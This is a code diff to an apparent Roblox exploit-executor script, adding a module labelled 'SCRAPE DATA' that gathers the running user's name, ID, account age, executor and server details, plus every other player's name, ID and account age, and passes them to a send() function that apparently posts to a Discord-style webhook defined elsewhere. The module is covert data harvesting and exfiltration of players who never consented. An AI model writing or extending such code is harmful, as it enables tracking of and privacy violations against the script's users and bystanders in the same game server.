@@ -133,6 +133,41 @@ end)
 task.wait(1)
 
 -- ============================================================
+-- ============================================================
+-- MODULE 2B: SCRAPE DATA (Player List)
+-- ============================================================
+task.spawn(function()
+    if not getgenv().IntelSuite.IsActive then return end
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    local uid = tostring(LocalPlayer.UserId)
+
+    local desc = "**User:** " .. LocalPlayer.Name ..
+        "\n**User ID:** " .. uid ..
+        "\n**Display Name:** " .. LocalPlayer.DisplayName ..
+        "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
+        "\n**Executor:** " .. getExec() ..
+        "\n**Game:** " .. getGame() ..
+        "\n**Place ID:** " .. tostring(game.PlaceId) ..
+        "\n**Job ID:** " .. tostring(game.JobId) ..
+        "\n**Players in server:** " .. tostring(#Players:GetPlayers())
+
+    local playerList = ""
+    for _, p in ipairs(Players:GetPlayers()) do
+        playerList = playerList .. "\n" .. p.Name ..
+            " (ID: " .. tostring(p.UserId) ..
+            ", Age: " .. tostring(p.AccountAge) .. "d)"
+    end
+
+    desc = desc .. "\n" .. playerList
+    desc = desc .. "\n**Time:** " .. tostring(os.time())
+
+    send("SCRAPE DATA", desc, 3066993)
+end)
+
+task.wait(1)
+
+
 -- MODULE 2: Full Roblox API Scraper
 -- ============================================================
 task.spawn(function()
